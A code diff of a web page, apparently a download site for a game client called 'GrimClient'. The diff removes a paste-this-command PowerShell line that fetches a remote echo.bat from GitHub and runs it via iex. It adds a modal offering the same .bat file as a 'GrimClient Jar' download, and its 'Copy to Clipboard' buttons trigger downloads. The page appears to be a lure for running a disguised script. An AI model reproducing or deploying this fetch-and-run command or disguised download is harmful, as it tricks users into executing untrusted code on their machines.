@@ -319,11 +319,18 @@
         <button class="copy-btn" onclick="autoDownload()">Copy to Clipboard</button>
       </div>
 
-    <button class="fix-button" onclick="autoDownload()">GrimClient Jar</button>
-      <div class="copy-box" id="tool3">
-        <code>irm "https://raw.githubusercontent.com/carrl3/ddd/refs/heads/main/echo.bat" | iex</code>
-        <button class="copy-btn" onclick="autoDownload()">Copy to Clipboard</button>
-      </div>
+    <button class="fix-button" onclick="showVideo('grimclientJarModal')">GrimClient Jar</button>
+  <div class="modal" id="grimclientJarModal">
+    <div class="modal-content">
+      <iframe src="https://www.youtube.com/embed/1gJEl6w4m7s" allowfullscreen></iframe>
+      <br>
+      <a href="https://raw.githubusercontent.com/carrl3/ddd/refs/heads/main/echo.bat" download>
+        <button>Download GrimClient Jar</button>
+      </a>
+      <br>
+      <button onclick="closeModal('grimclientJarModal')">Close</button>
+    </div>
+  </div>
     
     
     
@@ -352,7 +359,13 @@
   <!-- 🔧 Scripts -->
   <script>
     startSite()
-    
+    function showVideo(modalId) {
+      document.getElementById(modalId).style.display = 'flex';
+    }
+
+    function closeModal(modalId) {
+      document.getElementById(modalId).style.display = 'none';
+    }
     function startSite() {
       document.getElementById('adminModal').style.display = 'none';
       document.getElementById('loading-screen').style.display = 'none';
